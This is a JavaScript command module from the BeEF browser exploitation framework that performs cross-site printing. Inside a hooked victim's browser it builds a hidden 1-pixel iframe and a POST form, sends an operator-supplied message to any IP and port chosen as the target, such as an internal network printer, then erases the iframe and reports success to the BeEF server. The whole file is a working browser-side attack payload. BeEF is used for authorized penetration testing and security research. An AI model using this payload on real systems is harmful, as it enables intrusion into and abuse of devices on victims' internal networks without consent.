//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var target_ip = "<%= @ip %>";
	var target_port = "<%= @port %>";

	// send a request
	function send_msg(ip, port) {

		// create iframe
		var iframe = document.createElement("iframe");
		iframe.setAttribute("id","ipc_cross_site_printing_<%= @command_id %>");
		iframe.setAttribute("style", "visibility:hidden;width:1px;height:1px;");
		document.body.appendChild(iframe);
		iframe = document.getElementById("ipc_cross_site_printing_<%= @command_id %>");

		// create form
		var action = "http://" + ip + ":" + port + "/";
		myform=document.createElement("form");
		myform.setAttribute("name","data");
		myform.setAttribute("method","post");
		myform.setAttribute("enctype","multipart/form-data");
		myform.setAttribute("action",action);
		iframe.contentWindow.document.body.appendChild(myform);

		// create message textarea
		myExt = document.createElement("textarea");
		myExt.setAttribute("id","msg_<%= @command_id %>");
		myExt.setAttribute("name","msg_<%= @command_id %>");
		myExt.setAttribute("wrap","none");
		myExt.setAttribute("rows","70");
		myExt.setAttribute("cols","100");
		myform.appendChild(myExt);

		// send message
		iframe.contentWindow.document.getElementById("msg_<%= @command_id %>").value = "<%= @msg.gsub(/"/, '\\"').gsub(/\r?\n/, '\\n') %>";
		myform.submit();

		// clean up
		setTimeout('document.body.removeChild(document.getElementById("ipc_cross_site_printing_<%= @command_id %>"));', 15000);
	}

	// validate target
	if (!target_port || !target_ip || isNaN(target_port)) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed target host or target port');
	} else if (target_port > 65535 || target_port < 0) {
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');
	// send request and wait for reply
	} else {
		send_msg(target_ip, target_port);
		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');
	}

});

